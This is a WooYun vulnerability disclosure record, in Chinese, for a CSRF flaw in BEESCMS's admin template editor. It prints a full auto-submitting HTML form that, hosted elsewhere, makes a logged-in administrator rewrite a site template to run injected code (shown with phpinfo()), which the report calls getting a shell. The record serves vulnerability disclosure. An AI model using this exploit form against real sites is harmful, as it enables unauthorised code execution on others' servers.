{"id": 53663, "wybug_id": "wooyun-2014-066862", "wybug_title": "BEESCMS csrf+getshell", "wybug_corp": "beescms.com", "wybug_author": "menmen519", "wybug_date": "2014-07-06 12:41", "wybug_open_date": "2014-10-01 12:42", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-11：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-01：\t细节向公众公开  简要描述： BEESCMS 此间站应用没有对referer字段进行过滤，可导致csrf，并且获取shell 详细说明：  模板生成   --模板页面管理 \n\n   点击修改,如图所示:\n\n然后我们在另一台服务器上面构造好表单 表单内容如下：\n<html><form class=\"form\" action=\"http://192.168.10.70/BEES_V3.4_R_20140421/admin/admin_template.php?nav=list_tpl&admin_p_nav=tpl\" enctype=\"multipart/form-data\" method=\"post\" name=\"maininfo\"> <div class=\"order_main\"> <table width=\"100%\" cellspacing=\"0\" cellpadding=\"0\"> \t<thead>\t\t<tr><th style=\"width:10%; text-align:center\">参数说明</th><th class=\"w2\">参数值</th></tr>\t</thead>\t<tbody>\t\t<tr>\t\t  <td style=\"width:10%; text-align:center\">模板地址:</td><td class=\"w2\">template/default/sitemap.html</td>\t\t</tr>\t\t<tr>\t\t  <td style=\"width:10%; text-align:center\">修改:</td><td class=\"w2\"><textarea name=\"template\" style=\"width:100%; height:500px; font-size:12px;\">&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt;&lt;html xmlns=\"http://www.w3.org/1999/xhtml\"&gt;&lt;head&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"&gt;&lt;meta name=\"description\" content=\"{print weblangs('sitemap')/}\"&gt;&lt;meta name=\"keywords\" content=\"{print weblangs('sitemap')/}\"&gt;&lt;title&gt;{print weblangs('sitemap')/}_{print webinfo('web_name')/}&lt;/title&gt;&lt;link href=\"{path template/}/images/style.css\" rel=\"stylesheet\" type=\"text/css\"&gt;&lt;script type=\"text/javascript\" src=\"{path template/}/images/jquery.js\"&gt;&lt;/script&gt;&lt;script type=\"text/javascript\" src=\"{path template/}/images/nav.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;{include head/}&lt;div class=\"div_margin\"&gt;&lt;/div&gt;&lt;div class=\"contain\"&gt;\t&lt;div class=\"sitemap\"&gt;\t  &lt;div class=\"sitemap_box\"&gt;\t  {loop source=get_sitemap() item=$child}\t  &lt;h2&gt;&lt;a href=\"{print $child['url']/}\" title=\"{print $child['name']/}\"&gt;{print $child['name']/}&lt;/a&gt;&lt;/h2&gt;\t  {if $child['child']}\t    &lt;ul&gt;\t\t{loop source=$child['child'] item=$child2}\t\t &lt;li&gt;&lt;a href=\"{print $child2['url']/}\" title=\"{print $child2['name']/}\"&gt;{print $child2['name']/}&lt;/a&gt;&lt;/li&gt;\t\t {loop source=$child2['child']}\t\t &lt;li&gt;&lt;a href=\"{print $v['url']/}\" title=\"{print $v['name']/}\"&gt;{print $v['name']/}&lt;/a&gt;&lt;/li&gt;\t\t {/loop}\t\t {/loop}\t\t&lt;/ul&gt;\t  {/if}\t\t\t&lt;div class=\"clear\"&gt;&lt;/div&gt;\t\t{/loop}\t  &lt;/div&gt;\t \t&lt;/div&gt;&lt;!--网站地图--&gt;&lt;/div&gt;{include foot/}{print phpinfo()/}&lt;/body&gt;&lt;/html&gt;</textarea></td>\t\t</tr>\t\t\t</tbody> </table> </div><div class=\"order_btn\"><input type=\"hidden\" value=\"save_template\" name=\"action\"><input type=\"hidden\" value=\"template/default/sitemap.html\" name=\"file\">  <input type=\"submit\" name=\"submit\" class=\"go\" value=\"确定\"> </div></form><script>\tdocument.maininfo.submit();</script><html>\n\n\n\n\n成功提交了，我们然后去主页看看，站点地图哪里是否已经写入shell：\n\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-10-01 12:42 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}